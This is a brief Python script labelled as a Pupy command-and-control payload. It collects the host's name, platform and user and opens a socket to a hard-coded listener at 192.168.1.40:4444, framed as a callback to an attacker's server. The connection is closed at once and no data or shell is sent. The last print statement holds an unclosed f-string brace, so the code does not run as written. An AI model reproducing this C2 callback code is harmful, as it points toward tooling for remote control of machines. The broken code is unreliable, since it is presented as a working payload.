#!/usr/bin/env python3
"""
Payload - Pupy C2
Listener: 192.168.1.40:4444
"""

import socket
import platform
import os

def get_system_info():
    """Get system information"""
    return {
        'hostname': platform.node(),
        'platform': platform.system(),
        'user': os.getenv('USER', 'unknown'),
        'ip': '192.168.1.40',
        'port': 4444
    }

def connect_listener():
    """Connect to listener"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.1.40', 4444))
        s.close()
        return True
    except:
        return False

if __name__ == '__main__':
    info = get_system_info()
    print(f"[+] System Info: {info}")
    if connect_listener():
        print(f"[+] Connected to {'192.168.1.40:4444'")
    else:
        print("[-] Connection failed")
